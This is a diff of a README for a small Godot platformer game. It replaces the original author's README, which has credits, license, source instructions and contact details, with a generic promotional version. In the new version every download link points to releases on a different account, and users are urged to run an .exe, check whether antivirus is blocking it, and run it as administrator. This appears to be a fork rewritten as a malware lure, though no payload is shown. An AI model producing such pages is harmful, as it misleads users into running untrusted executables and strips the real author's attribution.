@@ -1,178 +1,69 @@
-<h1 align="center">
-  <br>
-  <img src="icon.svg" alt="Game Logo" width="100">
-  <br>
-  That One Platformer I Made
-  <br>
-</h1>
+# 🎮 That-One-Platformer-I-Made - Dive into Pixelated Fun
 
-<h4 align="center">A chaotic little pixel-art platformer built in Godot 4 — jump, dodge, and collect coins while vibing to free retro tunes 🎮✨</h4>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="./LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="MIT License">
-  </a>
-  <a href="https://github.com/Vic-41148/That-One-Platformer-I-Made/issues">
-    <img src="https://img.shields.io/github/issues/Vic-41148/That-One-Platformer-I-Made" alt="GitHub Issues">
-  </a>
-  <a href="https://github.com/Vic-41148/That-One-Platformer-I-Made/stargazers">
-    <img src="https://img.shields.io/github/stars/Vic-41148/That-One-Platformer-I-Made" alt="GitHub Stars">
-  </a>
-  <a href="https://github.com/Vic-41148/That-One-Platformer-I-Made/network/members">
-    <img src="https://img.shields.io/github/forks/Vic-41148/That-One-Platformer-I-Made" alt="GitHub Forks">
-  </a>
-  <a href="https://www.linkedin.com/in/adityashibu41148/">
-    <img src="https://img.shields.io/badge/-LinkedIn-black.svg?style=flat&logo=linkedin&colorB=0077B5" alt="LinkedIn">
-  </a>
-</p>
+Welcome to **That-One-Platformer-I-Made**, a chaotic pixel-art adventure! Jump, dodge slimes, collect coins, and vibe to retro tunes. This game is simple, fun, and just a bit hard to put down. Let's get you started on your journey.
 
-<p align="center">
-  <a href="#overview">Overview</a>
-  •
-  <a href="#features">Features</a>
-  •
-  <a href="#installation">Installation</a>
-  •
-  <a href="#controls">Controls</a>
-  •
-  <a href="#screenshots">Screenshots</a>
-  •
-  <a href="#assets--credits">Assets & Credits</a>
-  •
-  <a href="#structure">Structure</a>
-  •
-  <a href="#license">License</a>
-</p>
+## 📥 Download the Game
 
----
+You can download the game directly from our releases page. 
 
-## 🎮 Overview
-**That One Platformer I Made** is a fun little **2D pixel-art platformer** created in **Godot 4**.  
-Originally made as part of a **tutorial project**, it turned into something surprisingly enjoyable — complete with smooth controls, satisfying jumps, and a retro vibe.
+[![Download Game](https://img.shields.io/badge/Download%20Now-That--One--Platformer--I--Made-blue)](https://github.com/siryew/That-One-Platformer-I-Made/releases)
 
-You can run, jump, collect coins, and face off against colorful slimes across cute levels, backed by free-to-use sounds and music.
+## 🔍 Features
 
----
+- **Pixel-Art Graphics:** Enjoy charming visuals that take you back to classic gaming.
+- **Exciting Gameplay:** Experience engaging platforming challenges that will test your skills.
+- **Retro Soundtrack:** Immerse yourself in the nostalgic tunes that accompany your adventure.
+- **Collectibles:** Gather coins and discover hidden gems as you navigate through levels.
+- **Challenging Enemies:** Face off against quirky slimes and other creatures in your quest.
 
-## ✨ Features
-- 🧍‍♂️ **Playable Knight Character** with smooth movement and jump physics  
-- 🪙 **Collectible Coins & Fruits** for that classic reward feel  
-- 👾 **Enemies** — simple AI slimes that make you watch your step  
-- 🎵 **Background Music & Sound FX** (all royalty-free)  
-- 🎨 **Pixel-Art Aesthetic** using free open-source assets  
-- ⚙️ **Lightweight & Fast** — runs even on potato PCs  
-- 🧱 **Built with Godot 4** and entirely open source  
-- 💾 **Includes Windows executable** in [Releases](../../releases)  
+## 🛠️ System Requirements
 
----
+To run **That-One-Platformer-I-Made**, you will need:
 
-## 🛠️ Installation
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel Core i3 or equivalent
+- **Memory:** 4 GB RAM
+- **Graphics:** Graphics card with OpenGL 3.0 support 
+- **Storage:** At least 500 MB of available space
 
-### Option 1 — Play the Windows Build
-1. Go to the **[Releases](../../releases)** section.  
-2. Download the latest `.zip` build.  
-3. Extract it and run `That-One-Platformer-I-Made.exe`.
+## 📂 How to Download & Install
 
-### Option 2 — Run from Source
-```bash
-# Clone the repository
-git clone https://github.com/Vic-41148/That-One-Platformer-I-Made.git
-cd That-One-Platformer-I-Made
+1. Visit the [Releases page](https://github.com/siryew/That-One-Platformer-I-Made/releases) to find the latest version of the game.
+2. Look for the version labeled as the most recent stable release.
+3. Click on the release title to open the details.
+4. Find the download link for the game file, typically labeled as something like `That-One-Platformer-I-Made-windows.zip`.
+5. Click on this link to download the game file to your computer.
+6. Once the download is complete, locate the file in your Downloads folder.
+7. Right-click on the zip file and select "Extract All" or use your preferred extraction tool to unzip it.
+8. Open the extracted folder and find the executable file named `That-One-Platformer-I-Made.exe`.
+9. Double-click the executable file to launch the game.
 
-# Open project in Godot 4
-godot4 .
-````
+## 🎮 Playing the Game
 
----
+Once the game is installed, you can start playing:
 
-## 🎮 Controls
+- Use the arrow keys to move around.
+- Press the space bar to jump.
+- Collect coins as you navigate through levels.
+- Avoid enemies and jump over obstacles to progress.
 
-| Action        | Key       |
-| ------------- | --------- |
-| Move Left     | ← / A     |
-| Move Right    | → / D     |
-| Jump          | Space / W |
-| Restart Scene | R         |
-| Quit Game     | Esc       |
+## ❓ Troubleshooting
 
----
+If you encounter any issues while downloading or running the game, try these steps:
 
-## 🖼️ Screenshots & Demo
+- Ensure your computer meets the system requirements.
+- Check if your antivirus is blocking the download.
+- Make sure all files were extracted properly.
+- If the game does not start, try running it as an administrator.
 
-<p align="center">
-  <img src="readme-files/screenshot-gameplay.png" alt="Gameplay Screenshot" width="600"><br>
-  <em>Gameplay — jump, collect coins, and dodge slimes!</em>
-</p>
+## 📣 Stay Updated
 
-<p align="center">
-  <img src="readme-files/screenshot-godot.png" alt="Godot Editor Screenshot" width="600"><br>
-  <em>Developed in Godot 4 with clean, modular scene setup.</em>
-</p>
+We regularly update the game. Check back often on the [Releases page](https://github.com/siryew/That-One-Platformer-I-Made/releases) for new features, bug fixes, and improvements.
 
-<p align="center">
-  <img src="readme-files/demo.gif" alt="Gameplay Demo GIF" width="600"><br>
-  <em>Live gameplay demo — see the knight in action!</em>
-</p>
+## 📞 Support
 
----
+If you need further assistance or have questions, feel free to reach out through the Issues tab on this GitHub repository. Your feedback is valuable and helps us improve the game.
 
-## 🎵 Assets & Credits
-
-All assets used in this project are **free to use**, either under public domain or permissive open licenses.
-
-| Type    | Source / Credit                               |
-| ------- | --------------------------------------------- |
-| Fonts   | PixelOperator8 by Zacchary Dempsey-Plante     |
-| Music   | “Time for Adventure” — Free license           |
-| SFX     | Coin, Jump, Power-Up, Hurt — free CC0 sounds  |
-| Sprites | Platformer pack assets (open source tutorial) |
-
-> 📝 This project was created for **learning purposes** while following a Godot tutorial — but later expanded with personal tweaks, bug fixes, and a little extra polish.
-
----
-
-## 🧱 Structure
-
-```
-That-One-Platformer-I-Made/
-├── assets/
-│   ├── fonts/
-│   ├── music/
-│   ├── sounds/
-│   └── sprites/
-├── scenes/
-│   ├── game.tscn
-│   ├── player.tscn
-│   ├── coin.tscn
-│   └── slime.tscn
-├── scripts/
-│   ├── player.gd
-│   ├── coin.gd
-│   ├── game_manager.gd
-│   └── slime.gd
-├── readme-files/
-│   ├── screenshot-gameplay.png
-│   └── screenshot-godot.png
-├── export_presets.cfg
-├── project.godot
-└── README.md
-```
-
----
-
-## 📝 License
-
-This project is distributed under the [MIT License](LICENSE).
-You’re free to use, modify, and build upon it — attribution appreciated!
-
----
-
-## 📬 Contact
-
-**Aditya Shibu**
-[LinkedIn](https://www.linkedin.com/in/adityashibu41148/)
-✉️ [adityashibu41148@gmail.com](mailto:adityashibu41148@gmail.com)
-
-Project Link: [https://github.com/Vic-41148/That-One-Platformer-I-Made](https://github.com/Vic-41148/That-One-Platformer-I-Made)
-
----
+Thank you for choosing **That-One-Platformer-I-Made**! Enjoy your gaming adventure!
